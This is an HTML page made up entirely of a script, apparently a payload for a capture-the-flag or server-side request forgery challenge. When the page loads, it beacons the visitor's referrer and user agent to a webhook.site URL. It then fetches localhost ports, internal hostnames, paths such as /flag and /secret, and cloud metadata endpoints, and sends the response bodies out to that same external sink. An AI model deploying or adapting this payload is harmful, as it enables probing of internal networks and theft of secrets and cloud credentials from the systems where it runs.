<!doctype html><html><body><script>
const SINK="https://webhook.site/09c5215e-e357-47d9-ac61-d8d9c6ce464b";
function bx(t,d){try{new Image().src=SINK+'?b='+encodeURIComponent(t)+'&d='+encodeURIComponent(JSON.stringify(d)).slice(0,1500)+'&z='+Math.random();}catch(e){}}
bx('go',{ref:document.referrer,ua:navigator.userAgent.slice(0,30)});
const targets=[
 'http://127.0.0.1/','http://127.0.0.1:5000/','http://127.0.0.1:8000/','http://127.0.0.1:8080/','http://127.0.0.1:3000/','http://127.0.0.1:80/','http://127.0.0.1:5000/admin','http://127.0.0.1:5000/flag','http://127.0.0.1:5000/secret',
 'http://localhost:5000/','http://169.254.169.254/latest/meta-data/','http://169.254.169.254/computeMetadata/v1/',
 'http://cloud-console:5000/','http://clf:5000/','http://app:5000/','http://web:5000/','http://backend:5000/',
 'http://127.0.0.1:5000/internal/secret','http://127.0.0.1:5000/api/secret','http://127.0.0.1:5000/__debug__'
];
targets.forEach(u=>{
  fetch(u,{mode:'cors'}).then(r=>r.text()).then(t=>bx('READ',{u:u,len:t.length,body:t.slice(0,400)})).catch(e=>{
    // even if CORS-blocked, try no-cors to detect reachability
    fetch(u,{mode:'no-cors'}).then(()=>bx('REACH',{u:u})).catch(()=>{});
  });
});
